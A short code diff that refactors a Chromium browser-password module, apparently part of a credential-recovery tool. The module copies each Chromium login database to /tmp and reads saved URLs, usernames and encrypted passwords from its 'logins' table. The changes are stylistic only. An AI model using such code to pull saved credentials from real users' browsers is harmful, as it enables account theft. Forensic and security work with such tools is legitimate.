@@ -84,10 +84,7 @@ class ChromiumBased(ModuleInfo):
         try:
             cursor.execute('SELECT origin_url,username_value,password_value FROM logins')
             for url, user, password in cursor:
-                # Password encrypted on the database
-                if password[:3] == b'v10' or password[:3] == b'v11':
-
-                    # To decrypt it, Chromium Safe Storage from libsecret module is needed
+                if password[:3] in [b'v10', b'v11']:
                     if not constant.chrome_storage:
                         self.info('Password encrypted and Chrome Secret Storage not found')
                         continue
@@ -133,11 +130,9 @@ class ChromiumBased(ModuleInfo):
     def run(self):
         all_passwords = []
 
+        tmp = u'/tmp/chrome.db'
         for path in self.get_paths():
-            tmp = u'/tmp/chrome.db'
             shutil.copyfile(path, tmp)
 
-            for pw in self.get_passwords(tmp):
-                all_passwords.append(pw)
-
+            all_passwords.extend(iter(self.get_passwords(tmp)))
         return all_passwords
